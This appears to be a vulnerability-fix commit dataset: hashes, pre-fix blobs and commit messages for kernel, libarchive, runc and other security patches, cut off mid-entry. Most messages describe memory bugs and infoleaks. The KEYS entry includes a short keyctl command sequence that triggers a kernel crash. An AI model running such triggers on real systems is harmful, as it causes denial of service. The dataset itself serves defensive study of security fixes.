    12b0e67473ba2509193bf06048b4c0ff627430d5
    3df7b7ec178e87adad7ccb1dc4734e02d6a21d29
    8a23c53b946e346c8df8401d9ce602a52dbf7301
Projects:
    0-T-0_ps4-linux
Commit Message for 5a07975ad0a36708c6b0a5b9fea1ff811d0b0c1f:
USB: digi_acceleport: do sanity checking for the number of ports\n\nThe driver can be crashed with devices that expose crafted descriptors with too few endpoints.\n\nSee: http://seclists.org/bugtraq/2016/Mar/61\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> [johan: fix OOB endpoint check and add error messages ] Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    140ee8d2204b383279f854802b27bdb41c1d5d1a
File(s) In Commit: 
    minissdpd/minissdpd.c
Blob(s) In Commit: 
    5e79293e015c46bddd3fcf3247db9ec4214d78c7
Blob(s) Before Fix: 
    2421a42e5f80b0eccb3a56828e98259029a9f96f
    520a6c5aac957767afd39a6f60b10b0d3daf0c38
Projects:
    007jasonsmith_Catch
Commit Message for 140ee8d2204b383279f854802b27bdb41c1d5d1a:
minissdpd.c: Initialize pointers to NULL (fix)

======================================================================
Commit With Fix: 
    8b8addf891de8a00e4d39fc32f93f7c5eb8feceb
File(s) In Commit: 
    arch/x86/mm/mmap.c
Blob(s) In Commit: 
    389939f74dd5a544f16c9c4012c5a105d2420e45
Blob(s) Before Fix: 
    307f60ecfc6de33b062cfe75914895e186ca9e67
    96bd1e2bffafb3b8ffbc28906a2998ad992d50e8
Projects:
    0-T-0_ps4-linux
Commit Message for 8b8addf891de8a00e4d39fc32f93f7c5eb8feceb:
x86/mm/32: Enable full randomization on i386 and X86_32\n\nCurrently on i386 and on X86_64 when emulating X86_32 in legacy mode, only the stack and the executable are randomized but not other mmapped files (libraries, vDSO, etc.). This patch enables randomization for the libraries, vDSO and mmap requests on i386 and in X86_32 in legacy mode.\n\nBy default on i386 there are 8 bits for the randomization of the libraries, vDSO and mmaps which only uses 1MB of VA.\n\nThis patch preserves the original randomness, using 1MB of VA out of 3GB or 4GB. We think that 1MB out of 3GB is not a big cost for having the ASLR.\n\nThe first obvious security benefit is that all objects are randomized (not only the stack and the executable) in legacy mode which highly increases the ASLR effectiveness, otherwise the attackers may use these non-randomized areas. But also sensitive setuid/setgid applications are more secure because currently, attackers can disable the randomization of these applications by setting the ulimit stack to "unlimited". This is a very old and widely known trick to disable the ASLR in i386 which has been allowed for too long.\n\nAnother trick used to disable the ASLR was to set the ADDR_NO_RANDOMIZE personality flag, but fortunately this doesn't work on setuid/setgid applications because there is security checks which clear Security-relevant flags.\n\nThis patch always randomizes the mmap_legacy_base address, removing the possibility to disable the ASLR by setting the stack to "unlimited".\n\nSigned-off-by: Hector Marco-Gisbert <hecmargi@upv.es> Acked-by: Ismael Ripoll Ripoll <iripoll@upv.es> Acked-by: Kees Cook <keescook@chromium.org> Acked-by: Arjan van de Ven <arjan@linux.intel.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: akpm@linux-foundation.org Cc: kees Cook <keescook@chromium.org> Link: http://lkml.kernel.org/r/1457639460-5242-1-git-send-email-hecmargi@upv.es Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    a0ad220c96692eda76b2e3fd7279f3dcd1d8a8ff
File(s) In Commit: 
    drivers/input/misc/ims-pcu.c
Blob(s) In Commit: 
    9c0ea36913b4a98293911f62a2d649dc08a855cd
Blob(s) Before Fix: 
    1e1a4115043c5462f4c1351fdcfb6f3f5ca93106
    3d51175c4d7207aac2b7d625a2c9af26ec558cf0
    41ef29b516f3548e0dcebcff0be2bfcde322f4cb
    5a736397d9c8ee3f540ce9cc7b7f77710ff6b787
    719410feb84bf9521e94fad32d299e890c1b210b
    8fb814ccfd7a38577e339feb0508c638dceb9c37
    ac1fa5f4458052a97d5e8793123ce6b54623a9fa
    afed8e2b2f9449751f79ed219fa432e99e4c90e1
    b5304e26488154d347921db9952282b1c49cd60c
    e204f26b0011ae0f5ecfff4e6c28cd8e32481806
    eafb55c421814268000709c294bd5a9745062e52
    f4e8fbec6a942a8ea7a48e268b1e96f9fe458369
Projects:
    0-T-0_ps4-linux
Commit Message for a0ad220c96692eda76b2e3fd7279f3dcd1d8a8ff:
Input: ims-pcu - sanity check against missing interfaces\n\nA malicious device missing interface can make the driver oops. Add sanity checking.\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    d7a6be58edc01b1c66ecd8fcc91236bfbce0a420
File(s) In Commit: 
    drivers/acpi/apei/einj.c
Blob(s) In Commit: 
    8c1e5f17fb3da11d6151fa873db6de1684829211
Blob(s) Before Fix: 
    0431883653bed9d3c0394368fe87ced99043f185
    317679e39e9ed6fb43f1765605e43e4362806ff7
    559c1173de1c99177ba702c60d27993826510e9c
Projects:
    0-T-0_ps4-linux
Commit Message for d7a6be58edc01b1c66ecd8fcc91236bfbce0a420:
acpi: Disable APEI error injection if securelevel is set\n\nACPI provides an error injection mechanism, EINJ, for debugging and testing the ACPI Platform Error Interface (APEI) and other RAS features. If supported by the firmware, ACPI specification 5.0 and later provide for a way to specify a physical memory address to which to inject the error.\n\nInjecting errors through EINJ can produce errors which to the platform are indistinguishable from real hardware errors. This can have undesirable side-effects, such as causing the platform to mark hardware as needing replacement.\n\nWhile it does not provide a method to load unauthenticated privileged code, the effect of these errors may persist across reboots and affect trust in the underlying hardware, so disable error injection through EINJ if securelevel is set.\n\nSigned-off-by: Linn Crosetto <linn@hpe.com>

======================================================================
Commit With Fix: 
    69af385de62ea68e2e608335cffbb0f4aa3db091
File(s) In Commit: 
    libcontainer/user/user.go
Blob(s) In Commit: 
    9f4c2cb5b40acf32fc4034ee70a90350220bd122
Blob(s) Before Fix: 
    e6375ea4dd53ffd7423f8fa7693801024ae8b063
Projects:
    0xffea_runc
Commit Message for 69af385de62ea68e2e608335cffbb0f4aa3db091:
libcontainer: user: always treat numeric ids numerically\n\nMost shadow-related tools don't treat numeric ids as potential usernames, so change our behaviour to match that. Previously, using an explicit specification like 111:222 could result in the UID and GID not being 111 and 222 respectively (which is confusing).\n\nSigned-off-by: Aleksa Sarai <asarai@suse.de>

======================================================================
Commit With Fix: 
    9842df62004f366b9fed2423e24df10542ee0dc5
File(s) In Commit: 
    arch/x86/kvm/mtrr.c
Blob(s) In Commit: 
    c146f3c262c3bdd43f83e736688147559a8e9a4f
Blob(s) Before Fix: 
    0149ac59c273c15921bbe2a8cff7d9427e6a0976
    3f8c732117eccf73140fded817e1b155dfa76073
    9e8bf13572e6dc3f95d33d24f079d63e256a3a7a
    de1d2d8062e24048232af909d684f0c2ed9e21bc
Projects:
    0-T-0_ps4-linux
Commit Message for 9842df62004f366b9fed2423e24df10542ee0dc5:
KVM: MTRR: remove MSR 0x2f8\n\nMSR 0x2f8 accessed the 124th Variable Range MTRR ever since MTRR support was introduced by 9ba075a664df ("KVM: MTRR support").\n\n0x2f8 became harmful when 910a6aae4e2e ("KVM: MTRR: exactly define the size of variable MTRRs") shrinked the array of VR MTRRs from 256 to 8, which made access to index 124 out of bounds.  The surrounding code only WARNs in this situation, thus the guest gained a limited read/write access to struct kvm_arch_vcpu.\n\n0x2f8 is not a valid VR MTRR MSR, because KVM has/advertises only 16 VR MTRR MSRs, 0x200-0x20f.  Every VR MTRR is set up using two MSRs, 0x2f8 was treated as a PHYSBASE and 0x2f9 would be its PHYSMASK, but 0x2f9 was not implemented in KVM, therefore 0x2f8 could never do anything useful and getting rid of it is safe.\n\nThis fixes CVE-2016-3713.\n\nFixes: 910a6aae4e2e ("KVM: MTRR: exactly define the size of variable MTRRs") Cc: stable@vger.kernel.org Reported-by: David Matlack <dmatlack@google.com> Signed-off-by: Andy Honig <ahonig@google.com> Signed-off-by: Radim Krčmář <rkrcmar@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    9706d125b42481178d2b423de245f5d2faadbf40
File(s) In Commit: 
    gluon/globals.py
Blob(s) In Commit: 
    4f9ff81101a0320e1a49aebf3833dbe4ec321849
Blob(s) Before Fix: 
    5581ade84069bd18b136a1552250b309cafab0ee
Projects:
    2089764_web2py
Commit Message for 9706d125b42481178d2b423de245f5d2faadbf40:
DO NOT LEAK GLOBALS SETTINGS INTO request object

======================================================================
Commit With Fix: 
    b348d7dddb6c4fbfc810b7a0626e8ec9e29f7cbb
File(s) In Commit: 
    drivers/usb/usbip/usbip_common.c
Blob(s) In Commit: 
    e40da7759a0e6cd3a55bccdf90bb10284376ab11
Blob(s) Before Fix: 
    1838f1b2c2fafeed7bb05fae82fb859a18da1bdc
    45da3e01c7b03ae04b3c889e73d140baa2c9dc7f
    8b232290be6b97a04be362582e4a4d87db8d9185
    b2c9359d9ceec40bf71c4f8543090888f969a433
    facaaf003f19931b2f15603568bb565f3de40607
Projects:
    0-T-0_ps4-linux
Commit Message for b348d7dddb6c4fbfc810b7a0626e8ec9e29f7cbb:
USB: usbip: fix potential out-of-bounds write\n\nFix potential out-of-bounds write to urb->transfer_buffer usbip handles network communication directly in the kernel. When receiving a packet from its peer, usbip code parses headers according to protocol. As part of this parsing urb->actual_length is filled. Since the input for urb->actual_length comes from the network, it should be treated as untrusted. Any entity controlling the network may put any value in the input and the preallocated urb->transfer_buffer may not be large enough to hold the data. Thus, the malicious entity is able to write arbitrary data to kernel memory.\n\nSigned-off-by: Ignat Korchagin <ignat.korchagin@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    4e0d9b0b9740d258ade40cce248c93777362ac1e
File(s) In Commit: 
    libImaging/Resample.c
Blob(s) In Commit: 
    0d401c1df998373676475ab880dfa3501fa4caa3
Blob(s) Before Fix: 
    103e07e4b9d8f5be05b8fb2515f7223b20db6e86
    a87f2db8384e8258de873836b7b928b8b210a8b9
Projects:
    0x0all_pillow-simd
Commit Message for 4e0d9b0b9740d258ade40cce248c93777362ac1e:
fix integer overflow in Resample.c

======================================================================
Commit With Fix: 
    e79ef306afe332faf22e9b442a2c6b59cb175573
File(s) In Commit: 
    libarchive/archive_read_support_format_7zip.c
Blob(s) In Commit: 
    1dfe52b8539a0fd0cc9132db3ce56b51e412d42c
Blob(s) Before Fix: 
    194b8d51c96aa72e0c4430335ba57287417ef750
    90901acb710fff13d8737c13df21272bb430525b
    c0a536c4a981cae29c19d508acc281c3d02b8835
Projects:
    AasemShokr_libarchive
Commit Message for e79ef306afe332faf22e9b442a2c6b59cb175573:
Issue #718: Fix TALOS-CAN-152\n\nIf a 7-Zip archive declares a rediculously large number of substreams, it can overflow an internal counter, leading a subsequent memory allocation to be too small for the substream data.\n\nThanks to the Open Source and Threat Intelligence project at Cisco for reporting this issue.

======================================================================
Commit With Fix: 
    a550daeecf6bc689ade371349892ea17b5b97c77
File(s) In Commit: 
    libarchive/archive_read_support_format_mtree.c
Blob(s) In Commit: 
    8c3be9a294f8789c2d32756ae6f0ae16461e37ab
Blob(s) Before Fix: 
    16b55d01fe2587a643ed4ca054261d798b5f606a
    21d421e31a473c051ec63d6dc7695f599ac94ef5
    3abe198503a5da21875da44254a62d59ade1ca10
    3efcc37837e6193090aac6723deaa21a05bb5e6c
    81d96521138e4c976d41fcfc82115a767e7559ae
    b5f8e30d6d6d6d1e0e232e650a9a7b7f42e554a6
    c4e7021a869bbe9ce5d0ce4df6210f4763810dde
    d82d4c157353e9cb6429a0e241986b00d0cc12e6
Projects:
    AasemShokr_libarchive
Commit Message for a550daeecf6bc689ade371349892ea17b5b97c77:
Fix libarchive/archive_read_support_format_mtree.c:1388:11: error: array subscript is above array bounds

======================================================================
Commit With Fix: 
    05caadc7eedbef471ac9610809ba683f0c698700
File(s) In Commit: 
    libarchive/archive_read_support_format_rar.c
Blob(s) In Commit: 
    6c49f1a1501c9d341dd7ea2f843d3016a1ecfc7b
Blob(s) Before Fix: 
    6450aac82785b1c2cb48fd7b2d1d53530d08032b
Projects:
    AasemShokr_libarchive
Commit Message for 05caadc7eedbef471ac9610809ba683f0c698700:
Issue 719:  Fix for TALOS-CAN-154\n\nA RAR file with an invalid zero dictionary size was not being rejected, leading to a zero-sized allocation for the dictionary storage which was then overwritten during the dictionary initialization.\n\nThanks to the Open Source and Threat Intelligence project at Cisco for reporting this.

======================================================================
Commit With Fix: 
    b329a14adc40868965076a77210452e396243dcd
File(s) In Commit: 
    symphony/lib/core/class.session.php
Blob(s) In Commit: 
    dedb526fa88600a25a993ae8e8ef9ebfe4cde4f8
Blob(s) Before Fix: 
    c0075a1666c56fa45456f22e5cd8aba2cf381c05
Projects:
    1900_symphony-2
Commit Message for b329a14adc40868965076a77210452e396243dcd:
Better php.ini overrides for insecure setups\n\nThis change is to protect our users against a poorly setup server. PHP can allow pretty scary things security-wise, so it's best to make sure things that can only have one valid setting should be enforced.\n\nThanks to @hyp3rlinx for this.

======================================================================
Commit With Fix: 
    3ce424e45411cf5a13105e0386b6ecf6eeb4f66f
File(s) In Commit: 
    arch/x86/kvm/vmx.c
Blob(s) In Commit: 
    378a23ab60938b7be5202483208f908d51e57a13
Blob(s) Before Fix: 
    7ebf27bafe5cd217d3cdb403f5f283dd56fcaefe
Projects:
    0-T-0_ps4-linux
Commit Message for 3ce424e45411cf5a13105e0386b6ecf6eeb4f66f:
kvm:vmx: more complete state update on APICv on/off\n\nThe function to update APICv on/off state (in particular, to deactivate it when enabling Hyper-V SynIC) is incomplete: it doesn't adjust APICv-related fields among secondary processor-based VM-execution controls.  As a result, Windows 2012 guests get stuck when SynIC-based auto-EOI interrupt intersected with e.g. an IPI in the guest.\n\nIn addition, the MSR intercept bitmap isn't updated every time "virtualize x2APIC mode" is toggled.  This path can only be triggered by a malicious guest, because Windows didn't use x2APIC but rather their own synthetic APIC access MSRs  however a guest running in a SynIC-enabled VM could switch to x2APIC and thus obtain direct access to host APIC MSRs (CVE-2016-4440).\n\nThe patch fixes those omissions.\n\nSigned-off-by: Roman Kagan <rkagan@virtuozzo.com> Reported-by: Steve Rutherford <srutherford@google.com> Reported-by: Yang Zhang <yang.zhang.wz@gmail.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    5cd60033ea7f5bdf8c19c27b23ea2d773d9b09f5
File(s) In Commit: 
    plugins/src/allow_execmod.py
Blob(s) In Commit: 
    42f27518974fd52bdbb088d4c540218657ff1935
Blob(s) Before Fix: 
    a839fe33e608199d5747d6d8667d9bbcdfc3a343
Projects:
    Alphadelta14_apparmor
Commit Message for 5cd60033ea7f5bdf8c19c27b23ea2d773d9b09f5:
plugins: get rid of commands.getstatusoutput()

======================================================================
Commit With Fix: 
    38327424b40bcebe2de92d07312c89360ac9229a
File(s) In Commit: 
    security/keys/key.c
Blob(s) In Commit: 
    346fbf201c22e37e67dc58b5684c868e79ad9af5
Blob(s) Before Fix: 
    06783cffb3afa631fcca8efee90d17cc4f711b2c
    07a87311055c5b50916c87f2117f4c70b0321cfd
    09ef276c4bdcaf8e0c419df61d1cd7b07bf5253c
    135e1eb7e4688af394e672f6c8ee251172b2e402
    2048a110e7f18f0bd1e78006a88dc7bc675c9994
    2f4ce35ae2aafd6cd318651f5ef48a1a0f50e686
    4f64c7267afb64332db0e6218754a8d17190c870
    50d96d4e06f235c3e8950255c4b8bd5fd64aa7d2
    534808915371c2abf4801801fdccce72e7cd7759
    59402c84320319c0ee60b6f9dcd3cc7917d51568
    6d0cad16f00265a1dc31d8a0804984040fb47995
    6e21c11e48bc1cd434664d28f83084b54db50bd6
    7dc59069e8c76f9846d0dc5e1e4de15403c2e5ce
    8fb7c7bd465769cb5dca49e6d6f1ad011c75de63
    9a6108aefae929341e4bb82721bf47e56679c34a
    9c7e4ae6ff1313bad06aa95794ac2835b0b2e2ef
    ab7997ded7255258365169abaf820e811e0a7768
    aee2ec5a18fcafc02e5e9088b9b55b9276bbcdd9
    af7f6821d26b60219621d488d1797e60f791fa00
    b28755131687ea89de81ff5813c3fa9eb4acee74
    b90a68c4e2c4277035b21f873af64efcd95bf782
    bd5a272f28a66f689e3dc3bc0951d37e302ad301
    e17ba6aefdc0820b6c5c3af7cfc90d4e20094915
Projects:
    0-T-0_ps4-linux
Commit Message for 38327424b40bcebe2de92d07312c89360ac9229a:
KEYS: potential uninitialized variable\n\nIf __key_link_begin() failed then "edit" would be uninitialized.  I've added a check to fix that.\n\nThis allows a random user to crash the kernel, though it's quite difficult to achieve.  There are three ways it can be done as the user would have to cause an error to occur in __key_link():\n\n (1) Cause the kernel to run out of memory.  In practice, this is difficult      to achieve without ENOMEM cropping up elsewhere and aborting the      attempt.\n\n (2) Revoke the destination keyring between the keyring ID being looked up      and it being tested for revocation.  In practice, this is difficult to      time correctly because the KEYCTL_REJECT function can only be used      from the request-key upcall process.  Further, users can only make use      of what's in /sbin/request-key.conf, though this does including a      rejection debugging test - which means that the destination keyring      has to be the caller's session keyring in practice.\n\n (3) Have just enough key quota available to create a key, a new session      keyring for the upcall and a link in the session keyring, but not then      sufficient quota to create a link in the nominated destination keyring      so that it fails with EDQUOT.\n\nThe bug can be triggered using option (3) above using something like the following:\n\n	echo 80 >/proc/sys/kernel/keys/root_maxbytes 	keyctl request2 user debug:fred negate @t\n\nThe above sets the quota to something much lower (80) to make the bug easier to trigger, but this is dependent on the system.  Note also that the name of the keyring created contains a random number that may be between 1 and 10 characters in size, so may throw the test off by changing the amount of quota used.\n\nAssuming the failure occurs, something like the following will be seen:\n\n	kfree_debugcheck: out of range ptr 6b6b6b6b6b6b6b68h 	------------[ cut here ]------------ 	kernel BUG at ../mm/slab.c:2821! 	... 	RIP: 0010:[<ffffffff811600f9>] kfree_debugcheck+0x20/0x25 	RSP: 0018:ffff8804014a7de8  EFLAGS: 00010092 	RAX: 0000000000000034 RBX: 6b6b6b6b6b6b6b68 RCX: 0000000000000000 	RDX: 0000000000040001 RSI: 00000000000000f6 RDI: 0000000000000300 	RBP: ffff8804014a7df0 R08: 0000000000000001 R09: 0000000000000000 	R10: ffff8804014a7e68 R11: 0000000000000054 R12: 0000000000000202 	R13: ffffffff81318a66 R14: 0000000000000000 R15: 0000000000000001 	... 	Call Trace: 	  kfree+0xde/0x1bc 	  assoc_array_cancel_edit+0x1f/0x36 	  __key_link_end+0x55/0x63 	  key_reject_and_link+0x124/0x155 	  keyctl_reject_key+0xb6/0xe0 	  keyctl_negate_key+0x10/0x12 	  SyS_keyctl+0x9f/0xe7 	  do_syscall_64+0x63/0x13a 	  entry_SYSCALL64_slow_path+0x25/0x25\n\nFixes: f70e2e06196a ('KEYS: Do preallocation for __key_link()') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    87580d767868360d2fed503980129504da84b63e
File(s) In Commit: 
    modules/transport/xmlrpc/xmlrpclib.c
Blob(s) In Commit: 
    5fcde9e474de7a59974e375e0a50479dfcc35332
Blob(s) Before Fix: 
    b67d215233c84f6fa74b8e1b4de72fca902eea21
    dfae381c85cbc7c38c5722f2b218dff2b04c81e8
Projects:
    Acidburn0zzz_atheme
Commit Message for 87580d767868360d2fed503980129504da84b63e:
Do not copy more bytes than were allocated

======================================================================
Commit With Fix: 
    681fef8380eb818c0b845fca5d2ab1dcbab114ee
File(s) In Commit: 
    drivers/usb/core/devio.c
Blob(s) In Commit: 
    e9f5043a2167c2be13fb3cd5b5aab93efa7d9c23
Blob(s) Before Fix: 
    0b59731c302133aea9db105b2ee2d87a82dd137c
    11635537c052cdc5d4e4c78d615a09aafc4c5e83
    257876ea03a1a9102ac89d0282fb03affe813103
    38ae877c46e3124eb07c2a46ddd33bc66ac54d93
    4b0448c26810c31b1fafdcdaceb15534711e6221
    52c4461dfccddecff1bf1708c677bb605e9bc5a9
    59e7a3369084ab0b2d444991ce605a2259d47619
    66abdbcfbfa55c08c4989d5ce4fe16b087486a79
    73ce87166401a593d6b2ef55c52d9dc02197165e
    8df4b76465ac7d0b5eb0617b6ca2b6d7aec70c06
    90e18f6fa2bb08f63efa17fc91a9c0d837ddcc92
    967152a63bd3c92f86f937a5b2f3c7b1d0805cc2
    986abde076831921bf33f075a54fa8500630dd58
    9b7f1f75e88718400794efa61fa630959f2e0ef8
    adf74f575b80b19deced2f943b310afede7e96c6
    e500243803d87b1b3882acb5d37670af48f43f1b
Projects:
    0-T-0_ps4-linux
Commit Message for 681fef8380eb818c0b845fca5d2ab1dcbab114ee:
USB: usbfs: fix potential infoleak in devio\n\nThe stack object “ci” has a total size of 8 bytes. Its last 3 bytes are padding bytes which are not initialized and leaked to userland via “copy_to_user”.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    b8670c09f37bdf2847cc44f36511a53afc6161fd
File(s) In Commit: 
    net/llc/af_llc.c
Blob(s) In Commit: 
    8ae3ed97d95cb4a5f05b69b8c2922d57072a6fd1
Blob(s) Before Fix: 
    0080d2b0a8ae5f317df6b7bee4fdec59d4dc37bf
    17a8dff0609066e338b528328c4ed01259314d43
    2c0b83ce43bda478f6c56ebdc0951a54658c9098
    85aae8c84aebe7341f79bc4c87080dd86dc71e1a
    8dab4e569571dd34096104f87e8ed27faa7d5522
    8fd9febaa5bad8150bdf632b97221a140e0e3cbd
    b3c52e3f689ad16468eb603f1a5d11c55f3d7ae5
    b9bef2c750267cfd0adeaf918c1cc5503461d3db
    bb8edb9ef5064ee431ba0f1f618b4b2dba0304fb
    bb9cbc17d9267bc6f554f4ed985d3596fefcd91f
    c71b699eb555165e124ec21109e37212587c7741
    db916cf51ffeabd3d5246cb09a9e7227d483f574
Projects:
    0-T-0_ps4-linux
Commit Message for b8670c09f37bdf2847cc44f36511a53afc6161fd:
net: fix infoleak in llc\n\nThe stack object “info” has a total size of 12 bytes. Its last byte is padding which is not initialized and leaked via “put_cmsg”.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5f8e44741f9f216e33736ea4ec65ca9ac03036e6
File(s) In Commit: 
    net/core/rtnetlink.c
Blob(s) In Commit: 
    65763c29f84549583cf55546ff9a45bbe921a598
Blob(s) Before Fix: 
    0ec48403ed68cc77b29b120665ed707bced816c4
    215e6137f6ff794f127c74a3735726d02f8f3efe
    34ba7a08876de74409ea5d2ad3af6f78124ff0a7
    446cbaf811857171c96a01e3529a790b77cf0b8f
    482c3717a45edd0fbf326dbc6868db014caf449b
    504bd17b7456c3a16a0832ed28ede040c41ff316
    76321ea442c3e06c289e86184c5c4e513cbad7ff
    7ebed55b5f7d1b2d1faacea1a49e7f9e947f43d1
    8261d95dd846647798c7dba8f1dbfa4cf61a0eef
    a75f7e94b4456eed264a8d52c460f0b6bbf72569
    ab293a3066b34bc4f6af71701f0c12b9ab6e5a34
    d735e854f916040912fb12930cbc6a7950ace942
    f2066772d0f397c545737ff0a353f7f4f81ad5fc
Projects:
    0-T-0_ps4-linux
Commit Message for 5f8e44741f9f216e33736ea4ec65ca9ac03036e6:
net: fix infoleak in rtnetlink\n\nThe stack object “map” has a total size of 32 bytes. Its last 4 bytes are padding generated by compiler. These padding bytes are not initialized and sent out via “nla_put”.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
File(s) In Commit: 
    kernel/bpf/verifier.c
Blob(s) In Commit: 
    db2574e7b8b008395bb8fee53baf513fdc56c392
Blob(s) Before Fix: 
    2e08f8e9b771f032a17e0305c60fcd6f0403e6f5
    2e7f7ab739e41c46072a69e787bf4e44f560ae55
    618ef77c302ab628cd1a2c517568d4e0a10aa93e
    a28e09c7825d76d5ab10530a88fa183994f48d1e
    a7945d10b378bed8eb7243bd52923d232b1f49de
    c6073056badf02293c7e9d1e35dce9bb88536c67
    d1d3e8f57de907764fe3080632062485f5639443
Projects:
    0-T-0_ps4-linux
Commit Message for 8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7:
bpf: fix double-fdput in replace_map_fd_with_map_ptr()\n\nWhen bpf(BPF_PROG_LOAD, ...) was invoked with a BPF program whose bytecode references a non-map file descriptor as a map file descriptor, the error handling code called fdput() twice instead of once (in __bpf_map_get() and in replace_map_fd_with_map_ptr()). If the file descriptor table of the current task is shared, this causes f_count to be decremented too much, allowing the struct file to be freed while it is still in use (use-after-free). This can be exploited to gain root privileges by an unprivileged user.\n\nThis bug was introduced in commit 0246e64d9a5f ("bpf: handle pseudo BPF_LD_IMM64 insn"), but is only exploitable since commit 1be7f75d1668 ("bpf: enable non-root eBPF programs") because previously, CAP_SYS_ADMIN was required to reach the vulnerable code.\n\n(posted publicly according to request by maintainer)\n\nSigned-off-by: Jann Horn <jannh@google.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Acked-by: Alexei Starovoitov <ast@kernel.org> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2c1f6951a8a82e6de0d82b1158b5e493fc6c54ab
File(s) In Commit: 
    drivers/media/v4l2-core/videobuf2-v4l2.c
Blob(s) In Commit: 
    8da7470ca364cbff7e17ed565240195c0e418d5a
Blob(s) Before Fix: 
    91f552124050d2b3b91d2190af16fbdf2f9d7243
Projects:
    0-T-0_ps4-linux
Commit Message for 2c1f6951a8a82e6de0d82b1158b5e493fc6c54ab:
[media] videobuf2-v4l2: Verify planes array in buffer dequeueing\n\nWhen a buffer is being dequeued using VIDIOC_DQBUF IOCTL, the exact buffer which will be dequeued is not known until the buffer has been removed from the queue. The number of planes is specific to a buffer, not to the queue.\n\nThis does lead to the situation where multi-plane buffers may be requested and queued with n planes, but VIDIOC_DQBUF IOCTL may be passed an argument struct with fewer planes.\n\n__fill_v4l2_buffer() however uses the number of planes from the dequeued videobuf2 buffer, overwriting kernel memory (the m.planes array allocated in video_usercopy() in v4l2-ioctl.c)  if the user provided fewer planes than the dequeued buffer had. Oops!\n\nFixes: b0e0e1f83de3 ("[media] media: videobuf2: Prepare to divide videobuf2")\n\nSigned-off-by: Sakari Ailus <sakari.ailus@linux.intel.com> Acked-by: Hans Verkuil <hans.verkuil@cisco.com> Cc: stable@vger.kernel.org # for v4.4 and later Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

======================================================================
Commit With Fix: 
    cec8f96e49d9be372fdb0c3836dcf31ec71e457e
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    306a93dea20a913831d7c1291bcce995961a2474
Blob(s) Before Fix: 
    0cfc028c1193f4357f919b540f43cd4937c2c1f2
Projects:
    0-T-0_ps4-linux
Commit Message for cec8f96e49d9be372fdb0c3836dcf31ec71e457e:
ALSA: timer: Fix leak in SNDRV_TIMER_IOCTL_PARAMS\n\nThe stack object “tread” has a total size of 32 bytes. Its field “event” and “val” both contain 4 bytes padding. These 8 bytes padding bytes are sent to user without being initialized.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    79e48650320e6fba48369fccf13fd045315b19b8
File(s) In Commit: 
    net/x25/x25_facilities.c
Blob(s) In Commit: 
    997ff7b2509b49a3da6d3183fe65512f8f4caa38
Blob(s) Before Fix: 
    36384a1fa9f28a3316dd28079b2bc04fce25a0fa
    66c638730c7a862af95f3d83897505ce33518bd0
    7ecd04c21360994627f7b9ec0231bf454510fd46
    7fb327632272bb49feac1bbc5b1124460a8ae65a
    a21bdb95f9a8bfa81e7b05c99889d03406963905
    a21f6646eb3a85cd1275708ba53960ed085402da
    ad1734d36ed721d152e3135c4e6d3c91cec57d45
    b8253250d723314da1fd7b544289d49b38078c24
    c42bf2b8ec4fb0179b7924857a0a05244c3f2189
    de7552d8ee20045a4ab6091f2f8c01c9b98e7de0
    dea212f6bd0b589d6d78db9286793672c476249f
Projects:
    0-T-0_ps4-linux
Commit Message for 79e48650320e6fba48369fccf13fd045315b19b8:
net: fix a kernel infoleak in x25 module\n\nStack object "dte_facilities" is allocated in x25_rx_call_request(), which is supposed to be initialized in x25_negotiate_facilities. However, 5 fields (8 bytes in total) are not initialized. This object is then copied to userland via copy_to_user, thus infoleak occurs.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5ec0811d30378ae104f250bfc9b3640242d81e3f
File(s) In Commit: 
    fs/pnode.c
Blob(s) In Commit: 
    99899705b1055411723c3e5919ecbc1f50139e14
Blob(s) Before Fix: 
    1082a52a3f9696491abbcb743fc1d92a9a935c56
    234a9ac49958ed978f67aad68d81fb75cf5717ce
    260ac8f898a43de82de925d9befad1613a7764fb
    302bf22c4a30762013dbbfd64d0353250101eb62
    3e000a51ac0d09556d184d26422a91d0bc4c0ff9
    53d411a371ce8d7efd060ee3e9ad37053a54e4ab
    6367e1e435c64144a1d9adb94e9c1cfd1f157dfe
    7e23667bd1cd7619df8658a550ad1956861a8241
    88396df725b4bbe84dc7d57eaf7a259877e5d87c
    8d5f392ec3d39fa12a025ec3a6045b7ef8f790a4
